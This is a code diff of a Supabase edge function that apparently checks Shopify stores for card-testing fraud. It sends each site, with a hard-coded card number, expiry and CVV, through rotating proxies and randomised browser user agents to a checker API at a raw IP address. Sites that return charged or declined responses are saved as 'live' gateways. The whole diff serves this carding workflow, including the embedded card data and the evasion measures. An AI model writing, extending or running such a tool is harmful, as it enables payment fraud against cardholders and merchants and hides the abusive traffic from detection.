@@ -9,6 +9,26 @@ const corsHeaders = {
 };
 
 const TEST_CC = "4266841674104656|03|27|908";
+const API_BASE_URL = "http://188.137.230.163:5000/shopify";
+
+const userAgents = [
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
+  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+];
+
+const getRandomItem = <T>(arr: T[]): T => arr[Math.floor(Math.random() * arr.length)];
+
+const badResponses = [
+  "MERCHANDISE_EXPECTED_PRICE_MISMATCH",
+  "Site not supported",
+  "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
+  "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
+  "Payment method not available",
+  "ARTIFACT_DISSATISFACTION",
+  "VALIDATION_CUSTOM",
+];
 
 const extractPrice = (response: string): { price: number; priceStr: string } => {
   const pricePatterns = [
@@ -28,7 +48,7 @@ const extractPrice = (response: string): { price: number; priceStr: string } => 
       for (const match of matches) {
         const numericMatch = match.replace(/[^0-9.]/g, "");
         const value = parseFloat(numericMatch);
-        if (!isNaN(value) && value >= 0 && value < lowestPrice) {
+        if (!isNaN(value) && value > 0 && value < lowestPrice) {
           lowestPrice = value;
           priceStr = `$${value.toFixed(2)}`;
         }
@@ -42,30 +62,20 @@ const extractPrice = (response: string): { price: number; priceStr: string } => 
   };
 };
 
-const badResponses = [
-  "MERCHANDISE_EXPECTED_PRICE_MISMATCH",
-  "Site not supported",
-  "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
-  "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
-  "Payment method not available",
-  "ARTIFACT_DISSATISFACTION",
-  "VALIDATION_CUSTOM",
-];
-
 const checkSingleSite = async (
   siteUrl: string,
   proxyStr: string,
   supabase: ReturnType<typeof createClient>,
 ): Promise<{ url: string; status: string; price: number; priceStr: string; apiResponse?: string; error?: string }> => {
   const maxAttempts = 2;
-  const timeoutMs = 55000; // 55s per attempt — generous for slow sites
+  const timeoutMs = 60000;
 
   for (let attempt = 0; attempt < maxAttempts; attempt++) {
     try {
       const controller = new AbortController();
       const timeoutId = setTimeout(() => controller.abort(), timeoutMs);
 
-      const apiUrl = `http://188.137.230.163:5000/shopify?site=${encodeURIComponent(siteUrl)}&cc=${encodeURIComponent(TEST_CC)}&proxy=${encodeURIComponent(proxyStr)}`;
+      const apiUrl = `${API_BASE_URL}?site=${encodeURIComponent(siteUrl)}&cc=${encodeURIComponent(TEST_CC)}&proxy=${encodeURIComponent(proxyStr)}`;
 
       console.log(`[Attempt ${attempt + 1}] Checking: ${siteUrl}`);
 
@@ -73,45 +83,111 @@ const checkSingleSite = async (
         method: "GET",
         signal: controller.signal,
         headers: {
-          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
           "Accept": "application/json, text/plain, */*",
-          "Accept-Language": "en-US,en;q=0.9",
-          "Connection": "keep-alive",
+          "User-Agent": getRandomItem(userAgents),
           "Cache-Control": "no-cache",
         },
       });
 
       clearTimeout(timeoutId);
+      const rawText = await response.text();
 
-      const responseText = await response.text();
-
-      if (!response.ok || !responseText || responseText.length < 3) {
-        console.log(`[Attempt ${attempt + 1}] Bad HTTP response for ${siteUrl}: status=${response.status}, bodyLen=${responseText?.length ?? 0}`);
+      if (!rawText || rawText.trim() === "") {
+        console.log(`[Attempt ${attempt + 1}] Empty response for ${siteUrl}`);
         if (attempt < maxAttempts - 1) {
           await new Promise(r => setTimeout(r, 2000));
           continue;
         }
-        return { url: siteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse: responseText || `HTTP ${response.status}`, error: "No valid response" };
+        await supabase.from("gateway_urls").delete().eq("url", siteUrl);
+        return { url: siteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse: "Empty response", error: "Empty response" };
       }
 
-      const { price, priceStr } = extractPrice(responseText);
-      const truncated = responseText.length > 500 ? responseText.substring(0, 500) + "..." : responseText;
+      const truncated = rawText.length > 500 ? rawText.substring(0, 500) + "..." : rawText;
 
-      const isBad = badResponses.some(bad => responseText.toLowerCase().includes(bad.toLowerCase()));
+      // Check for bad responses — site is broken
+      const isBad = badResponses.some(bad => rawText.toLowerCase().includes(bad.toLowerCase()));
       if (isBad) {
         await supabase.from("gateway_urls").delete().eq("url", siteUrl);
         console.log(`[Result] ${siteUrl} → DEAD (bad response)`);
         return { url: siteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse: truncated, error: "Bad response detected" };
       }
 
-      if (price > 0) {
-        await supabase.from("gateway_urls").upsert({ url: siteUrl, price }, { onConflict: "url" });
-        console.log(`[Result] ${siteUrl} → LIVE (${priceStr})`);
-        return { url: siteUrl, status: "live", price, priceStr, apiResponse: truncated };
+      // Parse response — same logic as shopify-charge-check
+      let { price, priceStr } = extractPrice(rawText);
+      let apiResponse = truncated;
+
+      try {
+        const json = JSON.parse(rawText);
+        
+        // Extract Price from API JSON
+        if (json.Price !== undefined && json.Price > 0) {
+          price = json.Price;
+          priceStr = `$${Number(json.Price).toFixed(2)}`;
+        }
+        if (json.Response) {
+          apiResponse = String(json.Response).replace(/<[^>]*>/g, '');
+        }
+
+        const msg = json.message || json.msg || json.error || rawText;
+        const responseLower = (apiResponse || '').toLowerCase();
+        const combinedText = String(msg).toLowerCase() + ' ' + responseLower;
+
+        // CHARGED / success = site is live
+        if (json.status === 'CHARGED' || json.status === 'success' || json.full_response === true ||
+            combinedText.includes('order_placed') || combinedText.includes('order placed') ||
+            combinedText.includes('thank you') || combinedText.includes('charged') ||
+            combinedText.includes('approved')) {
+          await supabase.from("gateway_urls").upsert({ url: siteUrl, price }, { onConflict: "url" });
+          console.log(`[Result] ${siteUrl} → LIVE (${priceStr})`);
+          return { url: siteUrl, status: "live", price, priceStr, apiResponse };
+        }
+
+        // DECLINED / error = site is alive (merchant active) — keep it
+        if (json.status === 'DECLINED' || json.status === 'failed' || json.status === 'error' ||
+            json.full_response === false || json.status === 'DS_REQUIRED' || json.status === '3DS_REQUIRED' ||
+            combinedText.includes('declined') || combinedText.includes('insufficient') ||
+            combinedText.includes('do_not_honor') || combinedText.includes('card_declined') ||
+            combinedText.includes('ds_required') || combinedText.includes('3ds') ||
+            combinedText.includes('fraud') || combinedText.includes('restricted') ||
+            combinedText.includes('pickup_card') || combinedText.includes('lost_card') ||
+            combinedText.includes('generic_decline') || combinedText.includes('not_permitted')) {
+          // Site is alive — merchant processed the card, just declined it
+          if (price > 0) {
+            await supabase.from("gateway_urls").upsert({ url: siteUrl, price }, { onConflict: "url" });
+            console.log(`[Result] ${siteUrl} → LIVE (declined but active, ${priceStr})`);
+            return { url: siteUrl, status: "live", price, priceStr, apiResponse };
+          }
+          console.log(`[Result] ${siteUrl} → DEAD (declined, no price)`);
+          return { url: siteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse };
+        }
+      } catch {
+        // Not JSON — text-based fallback
+        const lower = rawText.toLowerCase();
+        if (lower.includes('order_placed') || lower.includes('charged') || lower.includes('success') || lower.includes('approved')) {
+          if (price > 0) {
+            await supabase.from("gateway_urls").upsert({ url: siteUrl, price }, { onConflict: "url" });
+            console.log(`[Result] ${siteUrl} → LIVE (${priceStr})`);
+            return { url: siteUrl, status: "live", price, priceStr, apiResponse: truncated };
+          }
+        }
+        if (lower.includes('declined') || lower.includes('3ds') || lower.includes('insufficient')) {
+          if (price > 0) {
+            await supabase.from("gateway_urls").upsert({ url: siteUrl, price }, { onConflict: "url" });
+            console.log(`[Result] ${siteUrl} → LIVE (declined but active, ${priceStr})`);
+            return { url: siteUrl, status: "live", price, priceStr, apiResponse: truncated };
+          }
+        }
       }
 
-      console.log(`[Result] ${siteUrl} → DEAD (price=0)`);
-      return { url: siteUrl, status: "dead", price, priceStr, apiResponse: truncated };
+      // Price > 0 but no clear status — still save it
+      if (price > 0) {
+        await supabase.from("gateway_urls").upsert({ url: siteUrl, price }, { onConflict: "url" });
+        console.log(`[Result] ${siteUrl} → LIVE (price detected: ${priceStr})`);
+        return { url: siteUrl, status: "live", price, priceStr, apiResponse };
+      }
+
+      console.log(`[Result] ${siteUrl} → DEAD (no price, unrecognized)`);
+      return { url: siteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse };
 
     } catch (err) {
       const msg = err instanceof Error ? err.message : "Unknown error";
@@ -140,7 +216,7 @@ Deno.serve(async (req) => {
 
     const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);
     
-    // Use getClaims for fast local JWT verification instead of getUser network call
+    // Fast local JWT verification
     const anonClient = createClient(SUPABASE_URL, Deno.env.get("SUPABASE_ANON_KEY") || "", {
       global: { headers: { Authorization: authHeader } },
     });
@@ -164,58 +240,31 @@ Deno.serve(async (req) => {
       return new Response(JSON.stringify({ error: "Admin access required" }), { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } });
     }
 
-    const { urls, threads = 5 } = await req.json();
+    const { url } = await req.json();
 
-    if (!urls || !Array.isArray(urls) || urls.length === 0) {
-      return new Response(JSON.stringify({ error: "No URLs provided" }), { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } });
+    if (!url || typeof url !== "string") {
+      return new Response(JSON.stringify({ error: "No URL provided" }), { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } });
     }
 
-    // Fetch live proxies
+    // Fetch a random live proxy
     const { data: liveProxies } = await supabase
       .from("proxies")
       .select("*")
       .eq("status", "live");
 
-    const getProxyStr = (): string => {
-      if (!liveProxies || liveProxies.length === 0) return "";
-      const randomProxy = liveProxies[Math.floor(Math.random() * liveProxies.length)];
-      if (randomProxy.username && randomProxy.password) {
-        return `${randomProxy.ip}:${randomProxy.port}:${randomProxy.username}:${randomProxy.password}`;
-      }
-      return `${randomProxy.ip}:${randomProxy.port}`;
-    };
-
-    // Process sites concurrently using threads parameter
-    const concurrency = Math.min(Math.max(threads, 1), 10);
-    const results: Array<{ url: string; status: string; price: number; priceStr: string; apiResponse?: string; error?: string }> = [];
-    let savedCount = 0;
-
-    // Process in concurrent chunks
-    for (let i = 0; i < urls.length; i += concurrency) {
-      const chunk = urls.slice(i, i + concurrency);
-      const chunkResults = await Promise.all(
-        chunk.map((siteUrl: string) => {
-          const proxyStr = getProxyStr();
-          return checkSingleSite(siteUrl, proxyStr, supabase);
-        })
-      );
-      for (const result of chunkResults) {
-        results.push(result);
-        if (result.status === "live") savedCount++;
-      }
+    let proxyStr = "";
+    if (liveProxies && liveProxies.length > 0) {
+      const randomProxy = getRandomItem(liveProxies);
+      proxyStr = randomProxy.username && randomProxy.password
+        ? `${randomProxy.ip}:${randomProxy.port}:${randomProxy.username}:${randomProxy.password}`
+        : `${randomProxy.ip}:${randomProxy.port}`;
     }
 
-    return new Response(
-      JSON.stringify({
-        success: true,
-        total: urls.length,
-        live: savedCount,
-        dead: results.filter(r => r.status === "dead").length,
-        errors: results.filter(r => r.status === "error").length,
-        results,
-      }),
-      { headers: { ...corsHeaders, "Content-Type": "application/json" } }
-    );
+    const result = await checkSingleSite(url, proxyStr, supabase);
+
+    return new Response(JSON.stringify(result), {
+      headers: { ...corsHeaders, "Content-Type": "application/json" },
+    });
   } catch (error) {
     console.error("Health check error:", error);
     return new Response(
